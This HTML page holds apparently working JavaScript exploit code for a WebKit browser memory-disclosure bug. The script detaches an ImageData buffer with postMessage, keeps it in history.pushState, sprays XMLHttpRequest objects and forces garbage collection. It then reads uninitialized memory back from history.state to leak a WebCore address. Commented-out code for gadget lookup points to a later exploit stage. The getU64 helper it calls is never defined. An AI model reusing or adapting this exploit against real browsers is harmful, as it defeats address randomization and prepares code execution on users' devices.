<pre id="d">
</pre>

<script>

function neuter(ab) {
    postMessage("", "*", [ab]);
}

function gc() {
    try {
        var c = document.createElement("canvas");
        var gl = c.getContext("2d");

        for (var i = 0; i < 100; i++) {
            var gggg = gl.createImageData(1, 0x10000/4)
        }
    } catch (e) {

    }
}


    function findWebcore() {
        var logged = false;

        function tryToFind() {
            var id = new ImageData(1, 0x540 / 4);
			alert(id);
			var state = new Array(0x100);
			for (var i = 0; i < state.length; ++ i) {
				state[i] = id;
			}

            neuter(id.data.buffer);
            history.pushState(state, "");

            var spray = [];
            for (var i = 0; i < 0x400; i++) {
                spray[i] = new XMLHttpRequest();
            }

            spray = null;
            gc();
/*
            function validate(addr) {
                if (!addr)
                    return null;

                if (Math.floor(addr / 0x1000000000) != 0x7ff)
                    return null;

                var gadgets = db[addr % 0x1000];
                if (!gadgets) {
                    if (!logged) {
                        logged = true;
                        log("maybe webcore has been changed: " + addr.toString(16));
                    }

                    return null;
                }

                return gadgets;
            }
*/

            var leak = history.state; //an uinit buffer, leak XMLHttpRequest's data
            
            
            for (var i = 0; i < leak.length; i++) {
                var two = getU64(leak[i].data, 0x18);
                if (two != 2)
                    continue;

                var addr = getU64(leak[i].data, 0);
				alert(addr.toString(16));
                //var gadgets = validate(addr);
                /*
                if (gadgets) {
                    return {
                        webcore_addr: addr - gadgets.webcore_offset,
                        gadgets: gadgets
                    };
                }*/
            }
            
            
            return null;
        }

        for (var i = 0; i < 20; i++) {
            var res = tryToFind();
            if (res)
                return res;
        }

        return null;
    }
    try {
	findWebcore();
	} catch(e) {alert(e)}
    

</script>
